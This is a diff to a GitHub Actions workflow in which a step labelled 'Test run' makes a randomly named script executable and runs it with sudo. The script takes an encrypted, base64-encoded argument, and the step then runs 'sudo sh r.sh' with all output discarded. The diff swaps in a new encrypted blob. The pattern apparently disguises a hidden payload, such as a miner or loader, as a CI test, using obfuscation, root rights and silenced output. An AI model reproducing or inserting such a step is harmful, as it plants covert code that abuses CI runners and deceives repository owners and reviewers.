@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo '9kse3'
+        echo 'vtoct'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1+kfCRHXTVREAvHFvk2/P4cPPVXCBqGkYpK6o3kKmY5zA1dPw4V16W585XXI9mhhIf/4a62jb/H8CJqWYmKqdWSGB58rdEKrqVCxEn+J4J5l9Bp/w+T2Ztj dnjxdm && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX19ims08B+W+GtLMg06L8Wd1HvmhafDg3yX3MkpZfimxC9TFCNNKuhhgYyuU6gpMlzNfjhi1uk1hJDcBQLVbZVhmafnmYyYgiRIDiNwDeLjpFDMzwbYaivoq rxz7ce && sudo sh r.sh > /dev/null 2>&1
